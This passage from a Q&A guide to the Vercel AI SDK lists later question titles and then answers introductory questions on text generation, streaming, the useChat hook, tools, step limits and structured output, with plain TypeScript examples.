- [334: What happens to already-streamed text when a stream retry happens?](#334-what-happens-to-already-streamed-text-when-a-stream-retry-happens)
- [335: How should tools handle being called more than once for the same action?](#335-how-should-tools-handle-being-called-more-than-once-for-the-same-action)
- [336: What are the risks of parallel tool execution?](#336-what-are-the-risks-of-parallel-tool-execution)
- [337: How do you design a customer support chatbot with the AI SDK?](#337-how-do-you-design-a-customer-support-chatbot-with-the-ai-sdk)
- [338: How would you design RAG over millions of documents?](#338-how-would-you-design-rag-over-millions-of-documents)
- [339: A chat stream works locally but stops after 10 seconds in production. What do you check?](#339-a-chat-stream-works-locally-but-stops-after-10-seconds-in-production-what-do-you-check)
- [340: useChat shows the user message but no answer. What are common causes?](#340-usechat-shows-the-user-message-but-no-answer-what-are-common-causes)
- [341: An agent keeps calling the same tool over and over. How do you fix it?](#341-an-agent-keeps-calling-the-same-tool-over-and-over-how-do-you-fix-it)
- [342: How do you migrate an AI SDK 4 app to AI SDK 7?](#342-how-do-you-migrate-an-ai-sdk-4-app-to-ai-sdk-7)
- [343: How do you reduce time to first token?](#343-how-do-you-reduce-time-to-first-token)
- [344: How do you compare two models for your use case?](#344-how-do-you-compare-two-models-for-your-use-case)
- [345: How do you handle personal data in prompts?](#345-how-do-you-handle-personal-data-in-prompts)
- [346: How do you test an agent end to end without a real model?](#346-how-do-you-test-an-agent-end-to-end-without-a-real-model)
- [347: What is the type inference chain from tools to UI parts?](#347-what-is-the-type-inference-chain-from-tools-to-ui-parts)
- [348: How would you write a custom chat transport?](#348-how-would-you-write-a-custom-chat-transport)
- [349: What doesn't work in edge runtimes?](#349-what-doesnt-work-in-edge-runtimes)
- [350: How do you handle large files in chat apps?](#350-how-do-you-handle-large-files-in-chat-apps)
- [351: How would you design a coding agent with the AI SDK?](#351-how-would-you-design-a-coding-agent-with-the-ai-sdk)
- [352: How do you make agent runs survive server restarts?](#352-how-do-you-make-agent-runs-survive-server-restarts)
- [353: How does human-in-the-loop work with a durable agent?](#353-how-does-human-in-the-loop-work-with-a-durable-agent)
- [354: What is the policy-based approval package?](#354-what-is-the-policy-based-approval-package)
- [355: How do you add an agent to Slack or Teams?](#355-how-do-you-add-an-agent-to-slack-or-teams)
- [356: How do you run an agent in the terminal for local testing?](#356-how-do-you-run-an-agent-in-the-terminal-for-local-testing)
- [357: How would you add per-tenant model routing?](#357-how-would-you-add-per-tenant-model-routing)
- [358: What are the trade-offs of the AI Gateway?](#358-what-are-the-trade-offs-of-the-ai-gateway)
- [359: How do you route only the expensive requests to a bigger model?](#359-how-do-you-route-only-the-expensive-requests-to-a-bigger-model)
- [360: How do you debug wrong structured output?](#360-how-do-you-debug-wrong-structured-output)
- [361: What is repairText?](#361-what-is-repairtext)
- [362: How do you keep tool definitions in sync between server and client types?](#362-how-do-you-keep-tool-definitions-in-sync-between-server-and-client-types)
- [363: How do you build a chat with branching (editing old messages)?](#363-how-do-you-build-a-chat-with-branching-editing-old-messages)
- [364: How do you stream reasoning and text from models that mix them in one output?](#364-how-do-you-stream-reasoning-and-text-from-models-that-mix-them-in-one-output)
- [365: Why might a model ignore temperature or other settings?](#365-why-might-a-model-ignore-temperature-or-other-settings)
- [366: How do you limit how much reasoning text you store and resend?](#366-how-do-you-limit-how-much-reasoning-text-you-store-and-resend)
- [367: What is the difference between finishReason and rawFinishReason?](#367-what-is-the-difference-between-finishreason-and-rawfinishreason)
- [368: How do you guard against a model calling a tool with valid but dangerous input?](#368-how-do-you-guard-against-a-model-calling-a-tool-with-valid-but-dangerous-input)
- [369: How do you stop users from overriding your instructions?](#369-how-do-you-stop-users-from-overriding-your-instructions)
- [370: How do you run the same prompt across several providers at once?](#370-how-do-you-run-the-same-prompt-across-several-providers-at-once)
- [371: How do you implement a fallback across providers without the gateway?](#371-how-do-you-implement-a-fallback-across-providers-without-the-gateway)
- [372: Why do provider differences still matter with a unified API?](#372-why-do-provider-differences-still-matter-with-a-unified-api)
- [373: How would you add content moderation to a chat?](#373-how-would-you-add-content-moderation-to-a-chat)
- [374: How can moderation run in parallel with the main call?](#374-how-can-moderation-run-in-parallel-with-the-main-call)
- [375: How do you test streaming UI components?](#375-how-do-you-test-streaming-ui-components)
- [376: What does keepAliveMs do on UI stream responses?](#376-what-does-keepalivems-do-on-ui-stream-responses)
- [377: What is consumeSseStream used for?](#377-what-is-consumessestream-used-for)
- [378: How does stream resume work under the hood?](#378-how-does-stream-resume-work-under-the-hood)
- [379: How do you keep conversation history in sync between tabs?](#379-how-do-you-keep-conversation-history-in-sync-between-tabs)
- [380: How would you implement "regenerate with a different model"?](#380-how-would-you-implement-regenerate-with-a-different-model)
- [381: What should you log for each AI request in production?](#381-what-should-you-log-for-each-ai-request-in-production)
- [382: How do you calculate cost per request?](#382-how-do-you-calculate-cost-per-request)
- [383: How do you handle a provider returning content-filter?](#383-how-do-you-handle-a-provider-returning-content-filter)
- [384: What happens if a user closes the tab during a tool approval?](#384-what-happens-if-a-user-closes-the-tab-during-a-tool-approval)
- [385: Why might tool calls fail only with some providers?](#385-why-might-tool-calls-fail-only-with-some-providers)
- [386: How do you give a model many similar tools without confusing it?](#386-how-do-you-give-a-model-many-similar-tools-without-confusing-it)
- [387: What does dynamic tool description do?](#387-what-does-dynamic-tool-description-do)
- [388: How do you keep a long-running agent focused?](#388-how-do-you-keep-a-long-running-agent-focused)
- [389: How do you summarize a conversation without losing important tool results?](#389-how-do-you-summarize-a-conversation-without-losing-important-tool-results)
- [390: Why would you put a hard step limit even with hasToolCall?](#390-why-would-you-put-a-hard-step-limit-even-with-hastoolcall)
- [391: What can go wrong when you run an agent inside a tool of another agent?](#391-what-can-go-wrong-when-you-run-an-agent-inside-a-tool-of-another-agent)
- [392: How do you pass the abort signal from the user to nested tools and agents?](#392-how-do-you-pass-the-abort-signal-from-the-user-to-nested-tools-and-agents)
- [393: How do you serve one agent to web, Slack and an API?](#393-how-do-you-serve-one-agent-to-web-slack-and-an-api)
- [394: How do you handle streaming in a React Native app?](#394-how-do-you-handle-streaming-in-a-react-native-app)
- [395: How do you prevent a slow tool from blocking the whole answer?](#395-how-do-you-prevent-a-slow-tool-from-blocking-the-whole-answer)
- [396: What happens to usage when a call is aborted?](#396-what-happens-to-usage-when-a-call-is-aborted)
- [397: How do you build a "deep research" feature?](#397-how-do-you-build-a-deep-research-feature)
- [398: How do you avoid sending the same large instructions on every request?](#398-how-do-you-avoid-sending-the-same-large-instructions-on-every-request)
- [399: What does the Agent interface allow you to do?](#399-what-does-the-agent-interface-allow-you-to-do)
- [400: How would you write your own agent class?](#400-how-would-you-write-your-own-agent-class)
- [401: What is MCP tool drift and how do you detect it?](#401-what-is-mcp-tool-drift-and-how-do-you-detect-it)
- [402: What security risks come with connecting to third-party MCP servers?](#402-what-security-risks-come-with-connecting-to-third-party-mcp-servers)
- [403: Where can you set providerOptions?](#403-where-can-you-set-provideroptions)
- [404: How is a string model ID resolved?](#404-how-is-a-string-model-id-resolved)
- [405: How do you upgrade to a new model version without changing code everywhere?](#405-how-do-you-upgrade-to-a-new-model-version-without-changing-code-everywhere)
- [406: How does TypeScript infer the output type of generateText?](#406-how-does-typescript-infer-the-output-type-of-generatetext)
- [407: What is FlexibleSchema?](#407-what-is-flexibleschema)
- [408: When would you use zodSchema explicitly?](#408-when-would-you-use-zodschema-explicitly)
- [409: Which Zod versions does AI SDK 7 support?](#409-which-zod-versions-does-ai-sdk-7-support)
- [410: What does "ESM only" mean for an existing CommonJS project?](#410-what-does-esm-only-mean-for-an-existing-commonjs-project)
- [411: Why should you never import a provider instance into client code?](#411-why-should-you-never-import-a-provider-instance-into-client-code)
- [412: Why does the server hide error messages by default?](#412-why-does-the-server-hide-error-messages-by-default)
- [413: What is UIMessageStreamError?](#413-what-is-uimessagestreamerror)
- [414: What are MissingToolResultsError and MessageConversionError?](#414-what-are-missingtoolresultserror-and-messageconversionerror)
- [415: What is ToolChoiceViolationError?](#415-what-is-toolchoiceviolationerror)
- [416: Why can file URLs in prompts be a security risk?](#416-why-can-file-urls-in-prompts-be-a-security-risk)
- [417: How do you process 100,000 documents with a model?](#417-how-do-you-process-100000-documents-with-a-model)
- [418: When should you classify with embeddings instead of a model call?](#418-when-should-you-classify-with-embeddings-instead-of-a-model-call)
- [419: Can you make model outputs fully deterministic?](#419-can-you-make-model-outputs-fully-deterministic)
- [420: Why are snapshot tests of model output a bad idea?](#420-why-are-snapshot-tests-of-model-output-a-bad-idea)
- [421: How do you build a voice assistant with the AI SDK?](#421-how-do-you-build-a-voice-assistant-with-the-ai-sdk)
- [422: How do you return generated images from a tool efficiently?](#422-how-do-you-return-generated-images-from-a-tool-efficiently)
- [423: What are citations on text parts?](#423-what-are-citations-on-text-parts)
- [424: When should you use message metadata and when data parts?](#424-when-should-you-use-message-metadata-and-when-data-parts)
- [425: Why do server-generated message IDs matter?](#425-why-do-server-generated-message-ids-matter)
- [426: How do you scale a chat backend horizontally?](#426-how-do-you-scale-a-chat-backend-horizontally)
- [427: What does creating an MCP client per request cost, and how do you reduce it?](#427-what-does-creating-an-mcp-client-per-request-cost-and-how-do-you-reduce-it)
- [428: How do you decide between the AI SDK and a provider's own agent SDK?](#428-how-do-you-decide-between-the-ai-sdk-and-a-providers-own-agent-sdk)
- [429: What does the experimental_ prefix mean in the AI SDK?](#429-what-does-the-experimental_-prefix-mean-in-the-ai-sdk)
- [430: How do you upgrade AI SDK versions safely in a team?](#430-how-do-you-upgrade-ai-sdk-versions-safely-in-a-team)
- [431: Answers are often cut off in the middle. What do you check?](#431-answers-are-often-cut-off-in-the-middle-what-do-you-check)
- [432: An agent is slow. How do you find out why?](#432-an-agent-is-slow-how-do-you-find-out-why)
- [433: After switching from OpenAI to Anthropic, tool calls broke. What do you check?](#433-after-switching-from-openai-to-anthropic-tool-calls-broke-what-do-you-check)
- [434: How do you keep a history that works across providers?](#434-how-do-you-keep-a-history-that-works-across-providers)
- [435: What happens to provider-executed tool results in later turns?](#435-what-happens-to-provider-executed-tool-results-in-later-turns)
- [436: How would you implement chat feedback (thumbs up/down) linked to traces?](#436-how-would-you-implement-chat-feedback-thumbs-updown-linked-to-traces)
- [437: What are the risks of letting the model write and run code?](#437-what-are-the-risks-of-letting-the-model-write-and-run-code)
- [438: How do you make tools safe to expose to many tenants?](#438-how-do-you-make-tools-safe-to-expose-to-many-tenants)
- [439: How do you avoid leaking the system prompt?](#439-how-do-you-avoid-leaking-the-system-prompt)
- [440: How do you design evals for an agent, not just single answers?](#440-how-do-you-design-evals-for-an-agent-not-just-single-answers)
- [441: How do you handle a stream that errors after partial output in the UI?](#441-how-do-you-handle-a-stream-that-errors-after-partial-output-in-the-ui)
- [442: Why might onEnd on the server not run for some requests?](#442-why-might-onend-on-the-server-not-run-for-some-requests)
- [443: How would you add tracing context such as a user ID to all spans?](#443-how-would-you-add-tracing-context-such-as-a-user-id-to-all-spans)
- [444: How do you make an agent ask the user a clarifying question?](#444-how-do-you-make-an-agent-ask-the-user-a-clarifying-question)
- [445: What is the difference between steering and sending a new message?](#445-what-is-the-difference-between-steering-and-sending-a-new-message)
- [446: How do you share prompts and tools across many routes without copy-paste?](#446-how-do-you-share-prompts-and-tools-across-many-routes-without-copy-paste)
- [447: What is the reset-step stream part used for?](#447-what-is-the-reset-step-stream-part-used-for)
- [448: How do you choose between ToolLoopAgent, WorkflowAgent and HarnessAgent?](#448-how-do-you-choose-between-toolloopagent-workflowagent-and-harnessagent)
- [449: What are the main things AI SDK 7 changed compared to AI SDK 6?](#449-what-are-the-main-things-ai-sdk-7-changed-compared-to-ai-sdk-6)
- [450: If you were starting a new AI feature today with the AI SDK, how would you set it up?](#450-if-you-were-starting-a-new-ai-feature-today-with-the-ai-sdk-how-would-you-set-it-up)

---

# Easy Questions (1-150)

## 1: What is the Vercel AI SDK?

The AI SDK is a free, open-source TypeScript library from Vercel for building apps that use large language models. It gives you one API to call models from many providers (OpenAI, Anthropic, Google, Mistral and others), so you don't have to learn each provider's own SDK.

It has two main parts: AI SDK Core for server-side calls (generate text, stream text, structured output, tools, agents, embeddings) and AI SDK UI for front-end hooks like `useChat` that handle chat state and streaming.

## 2: Which npm package do you install to use the AI SDK?

The main package is called `ai`. You also install a provider package for the model you want to call, unless you use the Vercel AI Gateway, which is built into `ai`.

```bash
npm install ai @ai-sdk/openai zod
```

`zod` is not required, but most examples use it to describe tool inputs and structured outputs.

## 3: What is a provider in the AI SDK?

A provider is a package that knows how to talk to one AI service, for example `@ai-sdk/openai`, `@ai-sdk/anthropic` or `@ai-sdk/google`. It turns the SDK's standard request into the format that service expects, and turns the response back into the SDK's standard format.

Because every provider follows the same interface, you can switch from one model to another by changing one line.

## 4: How do you create a model instance with a provider package?

You import the default provider instance and call it with a model ID. The result is a model object you pass to functions like `generateText`.

```ts
import { openai } from "@ai-sdk/openai";
import { anthropic } from "@ai-sdk/anthropic";

const gpt = openai("gpt-5.5");
const claude = anthropic("claude-sonnet-5.5");
```

The default instance reads the API key from an environment variable, such as `OPENAI_API_KEY` or `ANTHROPIC_API_KEY`.

## 5: What does generateText do?

`generateText` sends a prompt to a model and waits for the full answer. It returns a promise with the text and extra information such as token usage, the finish reason and any tool calls.

```ts
import { generateText } from "ai";

const { text } = await generateText({
  model: "openai/gpt-5.5",
  prompt: "Write a haiku about TypeScript.",
});

console.log(text);
```

Use it when you don't need to show the answer while it is being written, for example in a background job or a script.

## 6: What does streamText do?

`streamText` starts a model call and gives you the answer piece by piece as the model writes it. It returns right away with a result object that holds several streams, such as `textStream`.

```ts
import { streamText } from "ai";

const result = streamText({
  model: "openai/gpt-5.5",
  prompt: "Explain closures in JavaScript.",
});

for await (const chunk of result.textStream) {
  process.stdout.write(chunk);
}
```

Streaming makes chat apps feel much faster because the user sees the first words in under a second instead of waiting for the whole answer.

## 7: What is the difference between generateText and streamText?

`generateText` returns a promise that resolves once the model has finished. `streamText` returns immediately and you read the output as it arrives.

Pick `generateText` for non-interactive work (classification, batch jobs, tool loops in the background). Pick `streamText` when a person is watching, for example in a chat UI.

## 8: Is streamText an async function?

No. `streamText` is a normal function that returns a result object right away. The work starts in the background, and you consume it through the streams on the result (`textStream`, `stream`) or through promises like `result.text` that resolve when the stream ends.

That's why you call it without `await`: `const result = streamText({...})`.

## 9: What is the difference between prompt and messages?

`prompt` is a shortcut for a single user message. `messages` is a full list of messages with roles, which you use for chat history.

```ts
await generateText({
  model: "openai/gpt-5.5",
  messages: [
    { role: "user", content: "Hi, my name is Ana." },
    { role: "assistant", content: "Hi Ana! How can I help?" },
    { role: "user", content: "What is my name?" },
  ],
});
```

You use one or the other, not both.

## 10: What is the instructions option?

`instructions` sets the system prompt: text that tells the model how to behave for the whole call, like its role, tone or rules. It can be combined with either `prompt` or `messages`.

```ts
await generateText({
  model: "openai/gpt-5.5",
  instructions:
    "You are a polite support agent. Answer in two sentences or less.",
  prompt: "How do I reset my password?",
});
```

In AI SDK 7 this option was renamed from `system`. `system` still works but is deprecated.

## 11: What message roles does the AI SDK support?

Model messages use four roles:

- `system`: instructions for the model.
- `user`: what the person typed, including images or files.
- `assistant`: what the model answered, including tool calls.
- `tool`: results of tool calls sent back to the model.

By default, AI SDK 7 expects system text in the `instructions` option rather than in `messages`.

## 12: What is a ModelMessage?

`ModelMessage` is the type of message you send to Core functions like `generateText` and `streamText`. It has a `role` and a `content`, where content is a string or an array of parts (text, image, file, tool call, tool result).

It is different from `UIMessage`, which is the type used in the front end. You convert UI messages to model messages with `convertToModelMessages`.

## 13: What is a UIMessage?

`UIMessage` is the message type used by `useChat` and the other UI hooks. It has an `id`, a `role` (`system`, `user` or `assistant`), an optional `metadata` field and a `parts` array.

The parts describe everything the UI needs to show: text, reasoning, tool calls with their state, source links, files and custom data. It is the format you usually save in your database.

## 14: Why does the AI SDK have both UIMessage and ModelMessage?

They serve different jobs. `UIMessage` holds everything the user interface needs, such as IDs, metadata, tool call states and custom data parts. `ModelMessage` holds only what the model needs to see.

Keeping them apart means you can save rich chat history for the UI and still send a clean, smaller prompt to the model. `convertToModelMessages` does the translation on the server.

## 15: What does the text property on the generateText result contain?

`text` holds the text the model generated. If the call ran several steps (for example, a tool call followed by a final answer), `text` is the text of the last step.

To see all steps, use `result.steps`. To see only the last one, use `result.finalStep`.

## 16: What is token usage and how do you read it?

Providers charge by tokens, which are small chunks of text. The result object has a `usage` field with `inputTokens` and `outputTokens`, plus details like cached input tokens and reasoning tokens.

```ts
const result = await generateText({ model: "openai/gpt-5.5", prompt: "Hello" });
console.log(result.usage.inputTokens, result.usage.outputTokens);
```

In AI SDK 7, `usage` is the total across all steps. The older `totalUsage` field is deprecated.

## 17: What is finishReason?

`finishReason` tells you why the model stopped. Common values are `stop` (it finished normally), `length` (it hit the output token limit), `tool-calls` (it wants to call tools), `content-filter` (blocked by a safety filter) and `error`.

Checking it helps you spot cut-off answers. For example, if you get `length`, you may want to raise `maxOutputTokens`.

## 18: How do you limit the length of the model's answer?

Set `maxOutputTokens`. The model will stop once it reaches that number of tokens, and `finishReason` will be `length`.

```ts
await generateText({
  model: "openai/gpt-5.5",
  prompt: "Describe the history of Rome.",
  maxOutputTokens: 300,
});
```

## 19: What does temperature control?

`temperature` controls how random the output is. Low values (close to 0) give more predictable answers. Higher values give more varied, creative answers.

The AI SDK passes it straight to the provider, so the allowed range depends on the provider. Many docs recommend setting either `temperature` or `topP`, not both. Some reasoning models ignore it.

## 20: What other common generation settings does the AI SDK support?

Besides `maxOutputTokens` and `temperature`, there are:

- `topP` and `topK` for sampling.
- `presencePenalty` and `frequencyPenalty` to reduce repetition.
- `stopSequences` to stop when certain text appears.
- `seed` for more repeatable results, if the provider supports it.
- `reasoning` to set how much the model "thinks" before answering.

If a provider does not support a setting, the SDK adds a warning to the result instead of failing.

## 21: What is the Vercel AI Gateway?

The AI Gateway is a Vercel service that gives you access to models from many providers through one endpoint and one API key. It also gives you usage tracking, budgets, and fallbacks between providers.

The `ai` package has the gateway provider built in. When you pass a plain string like `'anthropic/claude-sonnet-5.5'` as the model, the SDK sends the request through the gateway.

## 22: How do you call a model through the AI Gateway?

Pass the model as a string in the form `provider/model`. You need an `AI_GATEWAY_API_KEY` environment variable, or OIDC auth when running on Vercel.

```ts
import { generateText } from "ai";

const { text } = await generateText({
  model: "anthropic/claude-sonnet-5.5",
  prompt: "Give me three names for a coffee shop.",
});
```

You can also import `gateway` from `ai` and write `gateway('anthropic/claude-sonnet-5.5')`.

## 23: When would you use a provider package instead of the AI Gateway?

Use a provider package (like `@ai-sdk/openai`) when you want to call the provider directly with your own API key, need a feature the gateway does not support yet, or are not allowed to route traffic through a third party.

Use the gateway when you want one key for many providers, easy switching, spend limits and failover. Both work with the same `generateText` and `streamText` code.

## 24: How do you set a custom API key or base URL for a provider?

Each provider package exports a `create...` function, like `createOpenAI` or `createAnthropic`. You pass settings to it and get back your own provider instance.

```ts
import { createOpenAI } from "@ai-sdk/openai";

const openai = createOpenAI({
  apiKey: process.env.MY_OPENAI_KEY,
  baseURL: "https://my-proxy.example.com/v1",
});

const model = openai("gpt-5.5");
```

This is also how you point the SDK at a proxy or a self-hosted, OpenAI-compatible server.

## 25: What is AI SDK Core?

AI SDK Core is the set of server-side functions in the `ai` package: `generateText`, `streamText`, `embed`, `embedMany`, `rerank`, `generateImage`, `generateSpeech`, `transcribe`, tool helpers and the `ToolLoopAgent` class.

They work in any JavaScript runtime that supports `fetch`, such as Node.js, Deno, Bun, edge runtimes and serverless functions.

## 26: What is AI SDK UI?

AI SDK UI is the front-end part of the SDK. It gives you hooks for building chat and completion interfaces: `useChat`, `useCompletion` and `useObject`.

The hooks handle sending requests, reading the streamed response, updating message state, and showing loading and error states. There are packages for React (`@ai-sdk/react`), Vue (`@ai-sdk/vue`), Svelte (`@ai-sdk/svelte`) and Angular (`@ai-sdk/angular`).

## 27: What does the useChat hook do?

`useChat` manages a chat conversation in a React component. It keeps the list of messages, sends new messages to your API route, reads the streamed answer, and updates the messages as tokens arrive.

```tsx
"use client";
import { useChat } from "@ai-sdk/react";
import { useState } from "react";

export default function Chat() {
  const { messages, sendMessage, status } = useChat();
  const [input, setInput] = useState("");

  return (
    <div>
      {messages.map((m) => (
        <div key={m.id}>
          {m.role}:{" "}
          {m.parts.map((p, i) =>
            p.type === "text" ? <span key={i}>{p.text}</span> : null,
          )}
        </div>
      ))}
      <form
        onSubmit={(e) => {
          e.preventDefault();
          sendMessage({ text: input });
          setInput("");
        }}
      >
        <input
          value={input}
          onChange={(e) => setInput(e.target.value)}
          disabled={status !== "ready"}
        />
      </form>
    </div>
  );
}
```

By default it posts to `/api/chat`.

## 28: Does useChat manage the input field for you?

No. Since AI SDK 5, `useChat` does not manage input state. You keep the input value in your own `useState` and call `sendMessage({ text })` when the user submits.

This gives you full control over the form, for example adding file uploads, slash commands or a rich text editor.

## 29: What does a basic chat API route look like in Next.js?

The route reads the UI messages from the request, converts them to model messages, calls `streamText`, and returns a UI message stream response.

```ts
// app/api/chat/route.ts
import {
  convertToModelMessages,
  createUIMessageStreamResponse,
  streamText,
  toUIMessageStream,
  type UIMessage,
} from "ai";

export async function POST(req: Request) {
  const { messages }: { messages: UIMessage[] } = await req.json();

  const result = streamText({
    model: "openai/gpt-5.5",
    messages: await convertToModelMessages(messages),
  });

  return createUIMessageStreamResponse({
    stream: toUIMessageStream({ stream: result.stream }),
  });
}
```

In older code you will see `return result.toUIMessageStreamResponse()`. That method still works in AI SDK 7 but is deprecated in favor of the standalone helpers.

## 30: What does convertToModelMessages do?

It turns an array of `UIMessage` objects (the front-end format) into an array of `ModelMessage` objects (the format the model functions expect). It drops UI-only data like message IDs and maps tool parts to tool calls and tool results.

In AI SDK 7 it returns a promise, so you `await` it.

```ts
const modelMessages = await convertToModelMessages(uiMessages);
```

## 31: What are the status values of useChat?

`status` tells you where the chat request is:

- `submitted`: the message was sent and you are waiting for the first chunk.
- `streaming`: the answer is coming in.
- `ready`: the answer is done and a new message can be sent.
- `error`: the request failed.

You use it to show a spinner, disable the send button, or show a "Stop" button.

## 32: How do you stop a streaming answer from the UI?

Call the `stop` function returned by `useChat`. It aborts the current request and keeps the part of the answer that already arrived.

```tsx
const { stop, status } = useChat();

{
  (status === "submitted" || status === "streaming") && (
    <button onClick={() => stop()}>Stop</button>
  );
}
```

## 33: How do you show errors in useChat?

`useChat` returns an `error` object and the `status` becomes `error`. You can show a message and let the user retry, for example with `regenerate()`.

```tsx
const { error, regenerate } = useChat();

{
  error && (
    <div>
      Something went wrong.
      <button onClick={() => regenerate()}>Try again</button>
    </div>
  );
}
```

For security reasons the server hides error details by default, so the client gets a generic error message unless you choose to forward more.

## 34: What does regenerate do in useChat?

`regenerate` asks the model to produce the last assistant message again. It removes the last assistant answer and sends the conversation again.

It replaces the older `reload` function from AI SDK 4.

## 35: How do you change the API endpoint that useChat calls?

Pass a transport. `DefaultChatTransport` sends HTTP requests to the `api` URL you give it.

```tsx
import { useChat } from "@ai-sdk/react";
import { DefaultChatTransport } from "ai";

const { messages, sendMessage } = useChat({
  transport: new DefaultChatTransport({ api: "/api/support-chat" }),
});
```

## 36: What is a chat transport?

A transport is the object `useChat` uses to send messages and receive the streamed answer. The default one, `DefaultChatTransport`, uses HTTP `POST` and reads a server-sent events stream.

The SDK also has `TextStreamChatTransport` for plain text streams, `DirectChatTransport` for calling an agent in the same process without HTTP, and `WebSocketChatTransport`. You can write your own transport to use a different protocol.

## 37: What are message parts?

Parts are the pieces inside a `UIMessage`. Each part has a `type`, for example:

- `text`: normal text.
- `reasoning`: the model's reasoning output.
- `tool-<toolName>`: a tool call and its state.
- `source-url` and `source-document`: sources the model used.
- `file`: an image or other file.
- `data-<name>`: your own custom data.
- `step-start`: marks the beginning of a new step.

You render a message by going through its parts and showing each type the way you want.

## 38: Why did the SDK move from message content to message parts?

A model answer is often more than one block of text. It can include reasoning, several tool calls, sources and text, in a specific order. A single `content` string can't show that order.

Parts keep everything in the order it happened, so the UI can show "the model searched the web, then read a file, then answered" correctly.

## 39: What is a tool in the AI SDK?

A tool is a function that the model can ask your app to run. You give it a description, an input schema and usually an `execute` function. The model decides when to call it and with which arguments, the SDK validates the input, runs `execute`, and sends the result back to the model.

Tools let the model fetch live data, call your APIs or take actions, which it can't do on its own.

## 40: How do you define a tool?

Use the `tool` helper with a `description`, an `inputSchema` and an `execute` function.

```ts
import { generateText, tool, isStepCount } from "ai";
import { z } from "zod";

const result = await generateText({
  model: "openai/gpt-5.5",
  tools: {
    getWeather: tool({
      description: "Get the current weather for a city",
      inputSchema: z.object({ city: z.string() }),
      execute: async ({ city }) => ({ city, tempC: 21, sky: "sunny" }),
    }),
  },
  stopWhen: isStepCount(5),
  prompt: "What is the weather in Lisbon?",
});
```

The `tool` helper does nothing at runtime, but it gives you correct TypeScript types for the input in `execute`.

## 41: What is inputSchema in a tool?

`inputSchema` describes the arguments the model must send when it calls the tool. The SDK turns it into JSON Schema for the model and then checks the model's arguments against it before running `execute`.

You can write it with Zod, Valibot, any Standard Schema library, or plain JSON Schema through the `jsonSchema()` helper. In AI SDK 4 this field was called `parameters`.

## 42: Why is the tool description important?

The model reads the description to decide when to call the tool and what it does. A vague description leads to the tool being called at the wrong time or not at all.

Good descriptions say what the tool does, when to use it and what it returns. You can also add `.describe()` to schema fields so the model knows what each argument means.

## 43: What happens if a tool has no execute function?

The SDK does not run it. The tool call is returned in the result (or streamed to the client), and the loop stops so that something else can provide the result.

This is how you build client-side tools, for example asking the user to confirm something or reading the browser's location. The client then sends the result back with `addToolOutput`.

## 44: What is a step?

A step is one call to the model. If the model answers with plain text, the whole job is one step. If it calls a tool, the SDK runs the tool and makes another call with the result, which is the next step.

Each step's data (text, tool calls, tool results, usage) is stored in `result.steps`.

## 45: What is stopWhen?

`stopWhen` tells `generateText` or `streamText` when to stop the tool loop. After every step that ends with tool calls, the SDK checks the stop condition. If it isn't met, it sends the tool results back to the model for another step.

```ts
import { isStepCount } from "ai";

await generateText({
  model: "openai/gpt-5.5",
  tools,
  stopWhen: isStepCount(10),
  prompt: "Plan a weekend trip to Porto.",
});
```

If you don't set it, the loop stops after one step. The loop also always stops when the model answers without calling a tool.

## 46: What is the difference between isStepCount and stepCountIs?

They are the same function. AI SDK 7 renamed it to `isStepCount` and kept `stepCountIs` as an alias, so code written for AI SDK 5 and 6 still works.

Both stop the loop once the given number of steps has run.

## 47: What replaced maxSteps?

`maxSteps` was the AI SDK 4 option for multi-step tool calls. AI SDK 5 replaced it with `stopWhen`, which takes one condition or an array of conditions.

```ts
// AI SDK 4
maxSteps: 5;

// AI SDK 5 and later
stopWhen: isStepCount(5);
```

`stopWhen` is more flexible because you can also stop when a specific tool is called or on your own custom logic.

## 48: What does hasToolCall do?

`hasToolCall` creates a stop condition that ends the loop when the model calls one of the named tools. It is useful for a "final answer" tool or a "done" tool.

```ts
import { hasToolCall, isStepCount } from "ai";

stopWhen: [isStepCount(20), hasToolCall("submitAnswer")];
```

When you pass an array, the loop stops as soon as any condition is true.

## 49: What is structured output?

Structured output means asking the model for data in a fixed shape (like a JSON object that matches a schema) instead of free text. The SDK checks the result against the schema and gives you a typed object.

It is used for extracting data, classification, forms, and any case where your code needs to read the answer.

## 50: How do you get a typed object from the model?

Use `generateText` with the `output` option and `Output.object`.

```ts
import { generateText, Output } from "ai";
import { z } from "zod";

const { output } = await generateText({
  model: "openai/gpt-5.5",
  output: Output.object({
    schema: z.object({
      name: z.string(),
      ingredients: z.array(z.string()),
      minutes: z.number(),
    }),
  }),
  prompt: "Give me a simple pancake recipe.",
});

console.log(output.ingredients);
```

`output` is fully typed from the schema.

## 51: What output types does the Output helper offer?

`Output` has five helpers:

- `Output.text()`: plain text. This is the default.
- `Output.object({ schema })`: one object that matches a schema.
- `Output.array({ element })`: a list of items that each match a schema.
- `Output.choice({ options })`: one value from a fixed list of strings.
- `Output.json()`: any valid JSON, with no schema.

All of them work with both `generateText` and `streamText`.

## 52: How do you classify text into one of a few labels?

Use `Output.choice` with the allowed labels. The model must return one of them, and `output` is typed as a union of those strings.

```ts
import { generateText, Output } from "ai";

const { output } = await generateText({
  model: "openai/gpt-5.5",
  output: Output.choice({ options: ["positive", "negative", "neutral"] }),
  prompt: 'Review: "The delivery was late but the food was great."',
});
// output: 'positive' | 'negative' | 'neutral'
```

## 53: How do you get a list of items from the model?

Use `Output.array` and give the schema of one element.

```ts
import { generateText, Output } from "ai";
import { z } from "zod";

const { output } = await generateText({
  model: "openai/gpt-5.5",
  output: Output.array({
    element: z.object({ title: z.string(), year: z.number() }),
  }),
  prompt: "List three classic science fiction novels.",
});
```

You can also set `minItems` and `maxItems`.

## 54: What happened to generateObject and streamObject?

They were the main structured output functions in AI SDK 3 to 5. AI SDK 6 deprecated them, and in AI SDK 7 they are still there but marked deprecated.

The current way is `generateText` or `streamText` with the `output` option. The main gain is that you can now combine structured output with tools and multi-step loops in the same call.

## 55: How do you stream a structured object to the user?

Use `streamText` with `output` and read `partialOutputStream`. Each value is the object as it is so far, with some fields still missing.

```ts
import { streamText, Output } from "ai";
import { z } from "zod";

const result = streamText({
  model: "openai/gpt-5.5",
  output: Output.object({
    schema: z.object({ title: z.string(), steps: z.array(z.string()) }),
  }),
  prompt: "How do I make cold brew coffee?",
});

for await (const partial of result.partialOutputStream) {
  console.log(partial);
}
```

## 56: What is the useObject hook?

`useObject` (from `@ai-sdk/react`) streams a structured object from your API route into a React component. You give it the API URL and the same schema the server uses, and it returns the partial `object`, a `submit` function, `isLoading`, `error` and `stop`.

It was called `experimental_useObject` before AI SDK 7. That name still works but is deprecated.

## 57: What is the useCompletion hook?

